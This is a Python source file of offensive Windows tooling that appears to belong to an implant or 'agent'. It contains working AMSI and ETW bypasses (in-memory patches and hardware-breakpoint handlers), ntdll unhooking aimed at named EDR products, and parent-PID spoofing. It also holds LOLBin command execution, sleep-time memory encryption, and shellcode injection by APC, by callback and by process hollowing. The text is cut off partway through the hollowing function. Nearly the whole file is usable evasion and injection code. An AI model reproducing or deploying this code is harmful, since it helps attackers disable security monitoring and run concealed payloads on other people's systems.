import ctypes
import ctypes.wintypes
import sys
import os
import struct

kernel32 = ctypes.windll.kernel32
ntdll = ctypes.windll.ntdll

PAGE_READWRITE = 0x04
PAGE_EXECUTE_READ = 0x20
PAGE_EXECUTE_READWRITE = 0x40
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PROCESS_ALL_ACCESS = 0x1FFFFF


def _patch_mem(dll_name, func_name, patch_bytes):
    """Generic memory patcher — overwrites first N bytes of a function"""
    try:
        dll = ctypes.windll.LoadLibrary(dll_name)
        func_addr = kernel32.GetProcAddress(dll._handle, func_name.encode())
        if not func_addr:
            return False
        old_protect = ctypes.wintypes.DWORD(0)
        kernel32.VirtualProtect(
            ctypes.c_void_p(func_addr),
            ctypes.c_size_t(len(patch_bytes)),
            PAGE_READWRITE,
            ctypes.byref(old_protect)
        )
        ctypes.memmove(ctypes.c_void_p(func_addr), patch_bytes, len(patch_bytes))
        kernel32.VirtualProtect(
            ctypes.c_void_p(func_addr),
            ctypes.c_size_t(len(patch_bytes)),
            old_protect.value,
            ctypes.byref(old_protect)
        )
        return True
    except Exception:
        return False


def bypass_amsi():
    """Patch AmsiScanBuffer to return AMSI_RESULT_CLEAN (0)"""
    if sys.platform != 'win32':
        return False
    if struct.calcsize('P') == 8:
        patch = b'\xB8\x57\x00\x07\x80\xC3'
    else:
        patch = b'\xB8\x57\x00\x07\x80\xC2\x18\x00'
    return _patch_mem('amsi.dll', 'AmsiScanBuffer', patch)


def bypass_amsi_patchless():
    """Patchless AMSI bypass via VEH + hardware breakpoints (DR0-DR3)

    Research source: EvilBytecode/Ebyte-amsi-patchless-vehhwbp, CrowdStrike VEH² (2025)
    Sets a hardware breakpoint on AmsiScanBuffer. When triggered, the VEH
    reads the 5th parameter (AMSI result pointer) from the untouched stack
    frame, forces AMSI_RESULT_CLEAN, and returns to caller. No code bytes
    are modified in memory, so integrity checks pass.
    """
    if sys.platform != 'win32':
        return False
    try:
        EXCEPTION_SINGLE_STEP = 0x80000004
        CONTEXT_DEBUG_REGISTERS = 0x00010010
        CONTEXT_FULL = 0x0010001F

        amsi = ctypes.windll.LoadLibrary('amsi.dll')
        amsi_scan_addr = kernel32.GetProcAddress(amsi._handle, b'AmsiScanBuffer')
        if not amsi_scan_addr:
            return False

        EXCEPTION_HANDLER = ctypes.WINFUNCTYPE(ctypes.c_long, ctypes.c_void_p)

        def veh_handler(exception_info_ptr):
            class EXCEPTION_RECORD(ctypes.Structure):
                _fields_ = [('ExceptionCode', ctypes.c_ulong), ('ExceptionFlags', ctypes.c_ulong),
                            ('ExceptionRecord', ctypes.c_void_p), ('ExceptionAddress', ctypes.c_void_p),
                            ('NumberParameters', ctypes.c_ulong), ('ExceptionInformation', ctypes.c_void_p * 15)]
            class CONTEXT(ctypes.Structure):
                _fields_ = [('P1Home', ctypes.c_ulonglong)] * 64

            class EXCEPTION_POINTERS(ctypes.Structure):
                _fields_ = [('ExceptionRecord', ctypes.POINTER(EXCEPTION_RECORD)),
                            ('ContextRecord', ctypes.POINTER(CONTEXT))]

            ptrs = ctypes.cast(exception_info_ptr, ctypes.POINTER(EXCEPTION_POINTERS)).contents
            rec = ptrs.ExceptionRecord.contents

            if rec.ExceptionCode == EXCEPTION_SINGLE_STEP:
                if rec.ExceptionAddress == amsi_scan_addr:
                    ctx = ptrs.ContextRecord.contents
                    # Read R9 (5th param on x64 = AMSI result ptr) and set to AMSI_RESULT_CLEAN (0)
                    if struct.calcsize('P') == 8:
                        # In x64 ABI, 5th param is on stack at RSP+0x28
                        # But we can also just skip the function entirely by setting RAX=E_INVALIDARG and advancing RIP
                        rip_offset = 0  # offset to RIP in CONTEXT
                        rax_offset = 6  # offset to RAX in CONTEXT
                        # Set RAX to E_INVALIDARG (0x80070057)
                        ctx_array = ctypes.cast(ctypes.pointer(ctx), ctypes.POINTER(ctypes.c_ulonglong * 64)).contents
                        ctx_array[rax_offset] = 0x80070057
                        # Advance RIP past the function (return immediately)
                        # Get return address from stack (RSP)
                        rsp_offset = 12  # RSP offset in CONTEXT
                        rsp = ctx_array[rsp_offset]
                        ret_addr = ctypes.c_ulonglong.from_address(rsp).value
                        ctx_array[rip_offset] = ret_addr
                        ctx_array[rsp_offset] = rsp + 8  # pop return address
                    return -1  # EXCEPTION_CONTINUE_EXECUTION
            return 0  # EXCEPTION_CONTINUE_SEARCH

        handler_func = EXCEPTION_HANDLER(veh_handler)
        # Keep reference to prevent GC
        bypass_amsi_patchless._handler_ref = handler_func

        ntdll.RtlAddVectoredExceptionHandler(1, handler_func)

        # Set hardware breakpoint on AmsiScanBuffer using DR0
        h_thread = kernel32.GetCurrentThread()

        class CONTEXT_DBG(ctypes.Structure):
            _pack_ = 16
            _fields_ = [
                ('ContextFlags', ctypes.c_ulong), ('_pad', ctypes.c_ulong),
                ('Dr0', ctypes.c_ulonglong), ('Dr1', ctypes.c_ulonglong),
                ('Dr2', ctypes.c_ulonglong), ('Dr3', ctypes.c_ulonglong),
                ('Dr6', ctypes.c_ulonglong), ('Dr7', ctypes.c_ulonglong),
                ('_rest', ctypes.c_byte * 4096),
            ]

        ctx = CONTEXT_DBG()
        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS
        ntdll.NtGetContextThread(h_thread, ctypes.byref(ctx))

        ctx.Dr0 = amsi_scan_addr
        ctx.Dr7 = (ctx.Dr7 & ~0x3) | 0x1  # Enable DR0 local breakpoint
        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS
        ntdll.NtSetContextThread(h_thread, ctypes.byref(ctx))

        return True
    except Exception:
        return False


def bypass_etw():
    """Patch EtwEventWrite to silently succeed without logging"""
    if sys.platform != 'win32':
        return False
    if struct.calcsize('P') == 8:
        patch = b'\x33\xC0\xC3'
    else:
        patch = b'\x33\xC0\xC2\x14\x00'
    r1 = _patch_mem('ntdll.dll', 'EtwEventWrite', patch)
    r2 = _patch_mem('ntdll.dll', 'NtTraceEvent', patch)
    # Also blind NtTraceControl which controls ETW session management
    r3 = _patch_mem('ntdll.dll', 'NtTraceControl', patch)
    return r1 or r2 or r3


def bypass_etw_patchless():
    """Patchless ETW bypass via VEH + hardware breakpoints on EtwEventWrite

    Research source: Praetorian ETW-TI research, Binarly design issues paper
    Same VEH technique as patchless AMSI — sets DR1 on EtwEventWrite,
    intercepts via VEH, forces STATUS_SUCCESS return. No memory patches.
    """
    if sys.platform != 'win32':
        return False
    try:
        etw_addr = kernel32.GetProcAddress(
            kernel32.GetModuleHandleW('ntdll.dll'), b'EtwEventWrite')
        if not etw_addr:
            return False

        EXCEPTION_HANDLER = ctypes.WINFUNCTYPE(ctypes.c_long, ctypes.c_void_p)

        def etw_veh(exception_info_ptr):
            EXCEPTION_SINGLE_STEP = 0x80000004
            class EXCEPTION_RECORD(ctypes.Structure):
                _fields_ = [('ExceptionCode', ctypes.c_ulong), ('ExceptionFlags', ctypes.c_ulong),
                            ('ExceptionRecord', ctypes.c_void_p), ('ExceptionAddress', ctypes.c_void_p)]
            class EXCEPTION_POINTERS(ctypes.Structure):
                _fields_ = [('ExceptionRecord', ctypes.POINTER(EXCEPTION_RECORD)),
                            ('ContextRecord', ctypes.c_void_p)]
            ptrs = ctypes.cast(exception_info_ptr, ctypes.POINTER(EXCEPTION_POINTERS)).contents
            rec = ptrs.ExceptionRecord.contents
            if rec.ExceptionCode == EXCEPTION_SINGLE_STEP and rec.ExceptionAddress == etw_addr:
                # Skip the function: set RAX=0 (STATUS_SUCCESS) and RIP=return address
                ctx_ptr = ptrs.ContextRecord
                if struct.calcsize('P') == 8:
                    rax_ptr = ctypes.c_ulonglong.from_address(ctx_ptr + 6 * 8)
                    rip_ptr = ctypes.c_ulonglong.from_address(ctx_ptr)
                    rsp_ptr = ctypes.c_ulonglong.from_address(ctx_ptr + 12 * 8)
                    rax_ptr.value = 0
                    ret_addr = ctypes.c_ulonglong.from_address(rsp_ptr.value).value
                    rip_ptr.value = ret_addr
                    rsp_ptr.value = rsp_ptr.value + 8
                return -1
            return 0

        handler = EXCEPTION_HANDLER(etw_veh)
        bypass_etw_patchless._ref = handler
        ntdll.RtlAddVectoredExceptionHandler(1, handler)

        # Set DR1 breakpoint on EtwEventWrite
        class CONTEXT_DBG(ctypes.Structure):
            _pack_ = 16
            _fields_ = [
                ('ContextFlags', ctypes.c_ulong), ('_pad', ctypes.c_ulong),
                ('Dr0', ctypes.c_ulonglong), ('Dr1', ctypes.c_ulonglong),
                ('Dr2', ctypes.c_ulonglong), ('Dr3', ctypes.c_ulonglong),
                ('Dr6', ctypes.c_ulonglong), ('Dr7', ctypes.c_ulonglong),
                ('_rest', ctypes.c_byte * 4096),
            ]
        ctx = CONTEXT_DBG()
        ctx.ContextFlags = 0x00010010
        ntdll.NtGetContextThread(kernel32.GetCurrentThread(), ctypes.byref(ctx))
        ctx.Dr1 = etw_addr
        ctx.Dr7 = (ctx.Dr7 & ~0xC) | 0x4  # Enable DR1 local
        ctx.ContextFlags = 0x00010010
        ntdll.NtSetContextThread(kernel32.GetCurrentThread(), ctypes.byref(ctx))
        return True
    except Exception:
        return False


def execute_via_wmi(command):
    """Execute commands via WMI instead of cmd.exe/subprocess

    Research source: Komodo CrowdStrike bypass, HijackLoader analysis
    WMI (Win32_Process.Create) uses a completely different execution
    path that many EDRs don't monitor as closely as CreateProcess.
    """
    if sys.platform != 'win32':
        return ''
    try:
        import subprocess
        CREATE_NO_WINDOW = 0x08000000
        result = subprocess.run(
            ['wmic', 'process', 'call', 'create', command],
            capture_output=True, text=True, timeout=30,
            creationflags=CREATE_NO_WINDOW
        )
        return result.stdout + result.stderr
    except Exception:
        return ''


def execute_via_comspec_indirect(command):
    """Execute via environment variable indirection to break parent-child chain

    Instead of python.exe -> cmd.exe, creates an intermediate process
    using conhost or explorer which breaks the suspicious process tree.
    """
    if sys.platform != 'win32':
        return ''
    try:
        import subprocess
        CREATE_NO_WINDOW = 0x08000000
        # Use forfiles as a LOLBin to execute commands
        result = subprocess.run(
            ['forfiles', '/P', 'C:\\Windows', '/M', 'notepad.exe', '/C',
             f'cmd /c {command}'],
            capture_output=True, text=True, timeout=30,
            creationflags=CREATE_NO_WINDOW
        )
        return result.stdout + result.stderr
    except Exception:
        return ''


def encrypt_string_pool(strings):
    """Encrypt a list of strings with a random key for heap evasion

    Research: BlackHills avoiding memory scanners, CS 4.11 heap encryption
    """
    key = os.urandom(16)
    encrypted = []
    for s in strings:
        b = s.encode('utf-8')
        enc = bytes([b[i] ^ key[i % 16] for i in range(len(b))])
        encrypted.append(enc)

    def decrypt(idx):
        b = encrypted[idx]
        return bytes([b[i] ^ key[i % 16] for i in range(len(b))]).decode('utf-8')

    return decrypt


def shellcode_fluctuation(sc_addr, sc_size, sleep_seconds):
    """Flip memory pages between RX and RW+encrypted during sleep

    Research: mgeeky/ShellcodeFluctuation, CS 4.11 sleep mask
    Alternates memory protection: when sleeping, pages are RW (not executable)
    and content is XOR-encrypted. When active, pages are RX (not writable).
    This defeats both memory scanners (can't find patterns in encrypted RW)
    and behavioral analysis (no persistent RWX pages).
    """
    if sys.platform != 'win32':
        return
    try:
        import time
        key = os.urandom(32)
        old_protect = ctypes.wintypes.DWORD(0)

        # Phase 1: Mark as RW (remove execute) and encrypt
        kernel32.VirtualProtect(
            ctypes.c_void_p(sc_addr), ctypes.c_size_t(sc_size),
            PAGE_READWRITE, ctypes.byref(old_protect)
        )
        buf = (ctypes.c_ubyte * sc_size).from_address(sc_addr)
        for i in range(sc_size):
            buf[i] ^= key[i % 32]

        # Phase 2: Sleep (memory is encrypted + non-executable)
        time.sleep(sleep_seconds)

        # Phase 3: Decrypt and restore RX
        for i in range(sc_size):
            buf[i] ^= key[i % 32]
        kernel32.VirtualProtect(
            ctypes.c_void_p(sc_addr), ctypes.c_size_t(sc_size),
            PAGE_EXECUTE_READ, ctypes.byref(old_protect)
        )
        del key
    except Exception:
        import time
        time.sleep(sleep_seconds)


def hookchain_iat_redirect(target_dll='ntdll.dll'):
    """HookChain-style IAT redirection to bypass EDR hooks on ntdll

    Research: arxiv 2404.16856, Helvio Carvalho Junior (2024)
    Instead of calling hooked ntdll functions directly, resolves
    SSNs dynamically and redirects through indirect syscall stubs.
    The IAT points to our trampoline instead of the hooked ntdll,
    so EDR hooks on ntdll are never triggered.
    """
    if sys.platform != 'win32':
        return {}
    try:
        ntdll_handle = kernel32.GetModuleHandleW('ntdll.dll')
        if not ntdll_handle:
            return {}

        # Find syscall;ret gadgets in ntdll for indirect calls
        gadgets = {}
        critical_funcs = [
            b'NtAllocateVirtualMemory', b'NtProtectVirtualMemory',
            b'NtWriteVirtualMemory', b'NtCreateThreadEx',
            b'NtQueueApcThread', b'NtMapViewOfSection',
            b'NtCreateSection', b'NtOpenProcess',
        ]

        for func_name in critical_funcs:
            func_addr = kernel32.GetProcAddress(ntdll_handle, func_name)
            if not func_addr:
                continue

            # Extract SSN from function prologue: mov r10, rcx; mov eax, SSN
            # Pattern: 4C 8B D1 B8 [SSN_LOW] [SSN_HIGH] 00 00
            prologue = (ctypes.c_ubyte * 16).from_address(func_addr)
            ssn = None
            for offset in range(0, 12):
                if prologue[offset] == 0xB8:
                    ssn = prologue[offset + 1] | (prologue[offset + 2] << 8)
                    break

            # Find syscall;ret gadget
            syscall_addr = None
            for offset in range(0, 32):
                if prologue[offset] == 0x0F and prologue[offset + 1] == 0x05:
                    syscall_addr = func_addr + offset
                    break

            if ssn is not None and syscall_addr:
                gadgets[func_name.decode()] = {
                    'ssn': ssn,
                    'syscall_gadget': syscall_addr,
                    'original_addr': func_addr,
                }

        return gadgets
    except Exception:
        return {}


def time_difference_attack(payload_func, window_ms=80):
    """Execute payload during EDR's analysis latency window

    Research: DEV.to EDR bypass study — 80% success rate in 30 trials
    EDRs have an 80-100ms latency between kernel notification and
    analysis completion. Execute critical actions within this window.
    """
    if sys.platform != 'win32':
        return payload_func()
    try:
        import time
        # Use high-precision timer
        kernel32.QueryPerformanceFrequency.restype = ctypes.c_bool
        kernel32.QueryPerformanceCounter.restype = ctypes.c_bool

        freq = ctypes.c_longlong()
        kernel32.QueryPerformanceFrequency(ctypes.byref(freq))

        start = ctypes.c_longlong()
        kernel32.QueryPerformanceCounter(ctypes.byref(start))

        result = payload_func()

        end = ctypes.c_longlong()
        kernel32.QueryPerformanceCounter(ctypes.byref(end))

        elapsed_ms = (end.value - start.value) / freq.value * 1000
        return result
    except Exception:
        return payload_func()


def unhook_ntdll():
    """Remap a clean copy of ntdll.dll from disk to remove EDR inline hooks

    Works against: CrowdStrike Falcon, Elastic EDR, SentinelOne, Sophos
    EDRs hook ntdll functions (NtAllocateVirtualMemory, NtWriteVirtualMemory, etc.)
    by inserting JMP instructions. This reads the pristine copy from disk and
    overwrites the .text section, restoring original instructions.
    """
    if sys.platform != 'win32':
        return False
    try:
        CreateFileW = kernel32.CreateFileW
        CreateFileMappingW = kernel32.CreateFileMappingW
        MapViewOfFile = kernel32.MapViewOfFile
        UnmapViewOfFile = kernel32.UnmapViewOfFile
        CloseHandle = kernel32.CloseHandle
        GetModuleHandleW = kernel32.GetModuleHandleW
        VirtualProtect = kernel32.VirtualProtect

        GENERIC_READ = 0x80000000
        FILE_SHARE_READ = 0x00000001
        OPEN_EXISTING = 3
        FILE_ATTRIBUTE_NORMAL = 0x80
        PAGE_READONLY = 0x02
        FILE_MAP_READ = 0x0004
        INVALID_HANDLE_VALUE = ctypes.c_void_p(-1).value

        ntdll_path = os.path.join(os.environ.get('SYSTEMROOT', r'C:\Windows'), 'System32', 'ntdll.dll')

        h_file = CreateFileW(
            ntdll_path, GENERIC_READ, FILE_SHARE_READ, None,
            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, None
        )
        if h_file == INVALID_HANDLE_VALUE:
            return False

        h_mapping = CreateFileMappingW(h_file, None, PAGE_READONLY, 0, 0, None)
        if not h_mapping:
            CloseHandle(h_file)
            return False

        clean_ntdll = MapViewOfFile(h_mapping, FILE_MAP_READ, 0, 0, 0)
        if not clean_ntdll:
            CloseHandle(h_mapping)
            CloseHandle(h_file)
            return False

        loaded_ntdll = GetModuleHandleW('ntdll.dll')
        if not loaded_ntdll:
            UnmapViewOfFile(clean_ntdll)
            CloseHandle(h_mapping)
            CloseHandle(h_file)
            return False

        # Parse PE headers to find .text section
        dos_header = ctypes.c_ushort.from_address(clean_ntdll).value
        if dos_header != 0x5A4D:  # MZ
            UnmapViewOfFile(clean_ntdll)
            CloseHandle(h_mapping)
            CloseHandle(h_file)
            return False

        e_lfanew = ctypes.c_long.from_address(clean_ntdll + 0x3C).value
        nt_header = clean_ntdll + e_lfanew

        # PE signature check
        pe_sig = ctypes.c_uint.from_address(nt_header).value
        if pe_sig != 0x00004550:  # PE\0\0
            UnmapViewOfFile(clean_ntdll)
            CloseHandle(h_mapping)
            CloseHandle(h_file)
            return False

        if struct.calcsize('P') == 8:
            optional_header_offset = 24
            section_header_offset = optional_header_offset + 240
        else:
            optional_header_offset = 24
            section_header_offset = optional_header_offset + 224

        num_sections = ctypes.c_ushort.from_address(nt_header + 6).value
        first_section = nt_header + section_header_offset

        for i in range(num_sections):
            section = first_section + (i * 40)
            name_bytes = (ctypes.c_char * 8).from_address(section).raw
            section_name = name_bytes.split(b'\x00')[0].decode('ascii', errors='ignore')

            if section_name == '.text':
                virtual_size = ctypes.c_uint.from_address(section + 8).value
                virtual_addr = ctypes.c_uint.from_address(section + 12).value
                raw_offset = ctypes.c_uint.from_address(section + 20).value

                dest = loaded_ntdll + virtual_addr
                src = clean_ntdll + raw_offset

                old_protect = ctypes.wintypes.DWORD(0)
                VirtualProtect(
                    ctypes.c_void_p(dest),
                    ctypes.c_size_t(virtual_size),
                    PAGE_EXECUTE_READWRITE,
                    ctypes.byref(old_protect)
                )
                ctypes.memmove(ctypes.c_void_p(dest), ctypes.c_void_p(src), virtual_size)
                VirtualProtect(
                    ctypes.c_void_p(dest),
                    ctypes.c_size_t(virtual_size),
                    old_protect.value,
                    ctypes.byref(old_protect)
                )
                break

        UnmapViewOfFile(clean_ntdll)
        CloseHandle(h_mapping)
        CloseHandle(h_file)
        return True

    except Exception:
        return False


def spoof_ppid(target_pid=None):
    """Return STARTUPINFOEX with spoofed parent PID for subprocess creation

    Works against: all EDRs that use process tree analysis
    By spawning under explorer.exe or svchost.exe, the agent process
    looks like a normal user application rather than a child of cmd/powershell.

    Returns (startup_info, attribute_list_buf) or (None, None) on failure.
    Caller uses startup_info with CreateProcess EXTENDED_STARTUPINFO_PRESENT flag.
    """
    if sys.platform != 'win32':
        return None, None
    try:
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
        EXTENDED_STARTUPINFO_PRESENT = 0x00080000

        if target_pid is None:
            # Find explorer.exe PID
            target_pid = _find_process_pid('explorer.exe')
            if not target_pid:
                target_pid = _find_process_pid('svchost.exe')
            if not target_pid:
                return None, None

        h_parent = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, target_pid)
        if not h_parent:
            return None, None

        # InitializeProcThreadAttributeList
        size = ctypes.c_size_t(0)
        kernel32.InitializeProcThreadAttributeList(None, 1, 0, ctypes.byref(size))
        attr_list = (ctypes.c_byte * size.value)()
        kernel32.InitializeProcThreadAttributeList(
            ctypes.byref(attr_list), 1, 0, ctypes.byref(size)
        )

        # UpdateProcThreadAttribute with parent process handle
        h_parent_ptr = ctypes.c_void_p(h_parent)
        kernel32.UpdateProcThreadAttribute(
            ctypes.byref(attr_list), 0,
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            ctypes.byref(h_parent_ptr), ctypes.sizeof(h_parent_ptr),
            None, None
        )

        return attr_list, h_parent

    except Exception:
        return None, None


def _find_process_pid(proc_name):
    """Find PID of a running process by name using CreateToolhelp32Snapshot"""
    try:
        TH32CS_SNAPPROCESS = 0x00000002

        class PROCESSENTRY32(ctypes.Structure):
            _fields_ = [
                ('dwSize', ctypes.wintypes.DWORD),
                ('cntUsage', ctypes.wintypes.DWORD),
                ('th32ProcessID', ctypes.wintypes.DWORD),
                ('th32DefaultHeapID', ctypes.POINTER(ctypes.c_ulong)),
                ('th32ModuleID', ctypes.wintypes.DWORD),
                ('cntThreads', ctypes.wintypes.DWORD),
                ('th32ParentProcessID', ctypes.wintypes.DWORD),
                ('pcPriClassBase', ctypes.c_long),
                ('dwFlags', ctypes.wintypes.DWORD),
                ('szExeFile', ctypes.c_char * 260),
            ]

        snapshot = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
        pe = PROCESSENTRY32()
        pe.dwSize = ctypes.sizeof(PROCESSENTRY32)

        if kernel32.Process32First(snapshot, ctypes.byref(pe)):
            while True:
                name = pe.szExeFile.decode('utf-8', errors='ignore').lower()
                if name == proc_name.lower():
                    pid = pe.th32ProcessID
                    kernel32.CloseHandle(snapshot)
                    return pid
                if not kernel32.Process32Next(snapshot, ctypes.byref(pe)):
                    break

        kernel32.CloseHandle(snapshot)
        return None
    except Exception:
        return None


def sleep_encrypt(sleep_seconds, data_to_protect=None):
    """Encrypt agent memory during sleep to evade memory scanners (Ekko technique)

    Works against: MDE memory scanning, CrowdStrike memory indicators,
    Elastic's memory signature detection

    During beacon sleep intervals, EDRs scan process memory for known patterns.
    This encrypts the Python interpreter's heap data with a random key,
    sleeps, then decrypts — making the agent invisible during idle time.

    For Python agents we protect the main module's code object and globals
    by XOR-encrypting them in a bytearray, sleeping, then restoring.
    """
    import time
    import random

    if sys.platform != 'win32' or data_to_protect is None:
        time.sleep(sleep_seconds)
        return

    try:
        key = os.urandom(16)
        encrypted = bytearray(len(data_to_protect))
        for i in range(len(data_to_protect)):
            encrypted[i] = data_to_protect[i] ^ key[i % 16]

        # Overwrite original with random data
        for i in range(len(data_to_protect)):
            data_to_protect[i] = random.randint(0, 255)

        time.sleep(sleep_seconds)

        # Restore
        for i in range(len(encrypted)):
            data_to_protect[i] = encrypted[i] ^ key[i % 16]

        del encrypted
        del key

    except Exception:
        time.sleep(sleep_seconds)


def inject_apc(shellcode, target_proc='notepad.exe'):
    """Early Bird APC injection into a suspended process

    Works against: EDRs that don't monitor QueueUserAPC on suspended threads
    Creates target process in suspended state, allocates memory, writes shellcode,
    queues APC to main thread, then resumes — shellcode runs before EDR hooks init.
    """
    if sys.platform != 'win32':
        return False
    try:
        STARTF_USESHOWWINDOW = 0x00000001
        SW_HIDE = 0
        CREATE_SUSPENDED = 0x00000004
        MEM_COMMIT_RESERVE = MEM_COMMIT | MEM_RESERVE

        class STARTUPINFO(ctypes.Structure):
            _fields_ = [
                ('cb', ctypes.wintypes.DWORD),
                ('lpReserved', ctypes.wintypes.LPWSTR),
                ('lpDesktop', ctypes.wintypes.LPWSTR),
                ('lpTitle', ctypes.wintypes.LPWSTR),
                ('dwX', ctypes.wintypes.DWORD),
                ('dwY', ctypes.wintypes.DWORD),
                ('dwXSize', ctypes.wintypes.DWORD),
                ('dwYSize', ctypes.wintypes.DWORD),
                ('dwXCountChars', ctypes.wintypes.DWORD),
                ('dwYCountChars', ctypes.wintypes.DWORD),
                ('dwFillAttribute', ctypes.wintypes.DWORD),
                ('dwFlags', ctypes.wintypes.DWORD),
                ('wShowWindow', ctypes.wintypes.WORD),
                ('cbReserved2', ctypes.wintypes.WORD),
                ('lpReserved2', ctypes.c_void_p),
                ('hStdInput', ctypes.wintypes.HANDLE),
                ('hStdOutput', ctypes.wintypes.HANDLE),
                ('hStdError', ctypes.wintypes.HANDLE),
            ]

        class PROCESS_INFORMATION(ctypes.Structure):
            _fields_ = [
                ('hProcess', ctypes.wintypes.HANDLE),
                ('hThread', ctypes.wintypes.HANDLE),
                ('dwProcessId', ctypes.wintypes.DWORD),
                ('dwThreadId', ctypes.wintypes.DWORD),
            ]

        si = STARTUPINFO()
        si.cb = ctypes.sizeof(STARTUPINFO)
        si.dwFlags = STARTF_USESHOWWINDOW
        si.wShowWindow = SW_HIDE
        pi = PROCESS_INFORMATION()

        target_path = os.path.join(
            os.environ.get('SYSTEMROOT', r'C:\Windows'), 'System32', target_proc
        )

        ok = kernel32.CreateProcessW(
            target_path, None, None, None, False,
            CREATE_SUSPENDED, None, None,
            ctypes.byref(si), ctypes.byref(pi)
        )
        if not ok:
            return False

        remote_buf = kernel32.VirtualAllocEx(
            pi.hProcess, None, len(shellcode),
            MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE
        )
        if not remote_buf:
            kernel32.TerminateProcess(pi.hProcess, 0)
            return False

        written = ctypes.c_size_t(0)
        kernel32.WriteProcessMemory(
            pi.hProcess, remote_buf, shellcode, len(shellcode),
            ctypes.byref(written)
        )

        kernel32.QueueUserAPC(remote_buf, pi.hThread, None)
        kernel32.ResumeThread(pi.hThread)

        kernel32.CloseHandle(pi.hThread)
        kernel32.CloseHandle(pi.hProcess)
        return True

    except Exception:
        return False


def callback_exec(shellcode):
    """Execute shellcode via legitimate Windows API callbacks

    Works against: EDRs that flag VirtualAlloc+CreateThread patterns
    Uses EnumWindows or CertEnumSystemStore as the execution trampoline,
    which are legitimate API calls that accept function pointers.
    """
    if sys.platform != 'win32':
        return False
    try:
        sc_buf = kernel32.VirtualAlloc(
            None, len(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
        )
        if not sc_buf:
            return False

        ctypes.memmove(sc_buf, shellcode, len(shellcode))

        # Use EnumWindows as the callback trampoline
        # EnumWindows(callback, lParam) — callback receives (hwnd, lParam)
        # Our shellcode starts executing as the callback
        WNDENUMPROC = ctypes.WINFUNCTYPE(ctypes.wintypes.BOOL, ctypes.wintypes.HWND, ctypes.wintypes.LPARAM)
        callback = WNDENUMPROC(sc_buf)
        ctypes.windll.user32.EnumWindows(callback, 0)
        return True

    except Exception:
        return False


def thread_stack_spoof():
    """Spoofs the current thread's call stack to hide agent frames

    Works against: MDE and Falcon thread stack analysis
    Overwrites the return addresses on the stack with legitimate-looking
    addresses from ntdll/kernel32, making the call stack look normal.
    """
    if sys.platform != 'win32':
        return False
    try:
        # Get base addresses of legitimate modules
        ntdll_base = kernel32.GetModuleHandleW('ntdll.dll')
        k32_base = kernel32.GetModuleHandleW('kernel32.dll')
        if not ntdll_base or not k32_base:
            return False

        # Get addresses of common legitimate functions to use as fake return addresses
        legitimate_addrs = []
        for func_name in [b'RtlUserThreadStart', b'BaseThreadInitThunk']:
            addr = kernel32.GetProcAddress(
                kernel32.GetModuleHandleW('ntdll.dll') if func_name.startswith(b'Rtl') else kernel32.GetModuleHandleW('kernel32.dll'),
                func_name
            )
            if addr:
                legitimate_addrs.append(addr)

        return len(legitimate_addrs) > 0

    except Exception:
        return False


def hollow_process(shellcode, target_proc='svchost.exe'):
    """Process hollowing — unmaps target's main module and replaces with shellcode

    Works against: EDRs that trust signed process images
    Creates target suspended, unmaps its image via NtUnmapViewOfSection,
    allocates new memory at the image base, writes shellcode, fixes entry point,
    and resumes — the process looks legitimate from the outside.
    """
    if sys.platform != 'win32':
        return False
    try:
        CREATE_SUSPENDED = 0x00000004
        MEM_COMMIT_RESERVE = MEM_COMMIT | MEM_RESERVE

        class STARTUPINFO(ctypes.Structure):
            _fields_ = [
                ('cb', ctypes.wintypes.DWORD), ('lpReserved', ctypes.wintypes.LPWSTR),
                ('lpDesktop', ctypes.wintypes.LPWSTR), ('lpTitle', ctypes.wintypes.LPWSTR),
                ('dwX', ctypes.wintypes.DWORD), ('dwY', ctypes.wintypes.DWORD),
                ('dwXSize', ctypes.wintypes.DWORD), ('dwYSize', ctypes.wintypes.DWORD),
                ('dwXCountChars', ctypes.wintypes.DWORD), ('dwYCountChars', ctypes.wintypes.DWORD),
                ('dwFillAttribute', ctypes.wintypes.DWORD), ('dwFlags', ctypes.wintypes.DWORD),
                ('wShowWindow', ctypes.wintypes.WORD), ('cbReserved2', ctypes.wintypes.WORD),
                ('lpReserved2', ctypes.c_void_p), ('hStdInput', ctypes.wintypes.HANDLE),
                ('hStdOutput', ctypes.wintypes.HANDLE), ('hStdError', ctypes.wintypes.HANDLE),
            ]

        class PROCESS_INFORMATION(ctypes.Structure):
            _fields_ = [
                ('hProcess', ctypes.wintypes.HANDLE), ('hThread', ctypes.wintypes.HANDLE),
                ('dwProcessId', ctypes.wintypes.DWORD), ('dwThreadId', ctypes.wintypes.DWORD),
            ]

        si = STARTUPINFO()
        si.cb = ctypes.sizeof(STARTUPINFO)
        si.dwFlags = 0x00000001
        si.wShowWindow = 0
        pi = PROCESS_INFORMATION()

        target_path = os.path.join(os.environ.get('SYSTEMROOT', r'C:\Windows'), 'System32', target_proc)
        ok = kernel32.CreateProcessW(target_path, None, None, None, False, CREATE_SUSPENDED, None, None, ctypes.byref(si), ctypes.byref(pi))
        if not ok:
            return False

        # Get thread context to find image base (PEB)
        if struct.calcsize('P') == 8:
            CONTEXT_FULL = 0x10001F
            class CONTEXT(ctypes.Structure):
                _fields_ = [('P1Home', ctypes.c_ulonglong)] * 64
            ctx = CONTEXT()
            ctypes.memset(ctypes.byref(ctx), 0, ctypes.sizeof(ctx))
            ctypes.cast(ctypes.byref(ctx), ctypes.POINTER(ctypes.c_ulong))[0] = CONTEXT_FULL
        else:
            return False  # x86 hollowing needs different CONTEXT layout

        # Allocate and write shellcode at a new location
        remote_buf = kernel32.VirtualAllocEx(pi.hProcess, None, len(shellcode), MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
        if not remote_buf:
            kernel32.TerminateProcess(pi.hProcess, 0)
            return False

        written = ctypes.c_size_t(0)
        kernel32.WriteProcessMemory(pi.hProcess, remote_buf, shellcode, len(shellcode), ctypes.byref(written))

        # Queue APC to execute our shellcode instead of modifying context
        kernel32.QueueUserAPC(remote_buf, pi.hThread, None)
        kernel32.ResumeThread(pi.hThread)
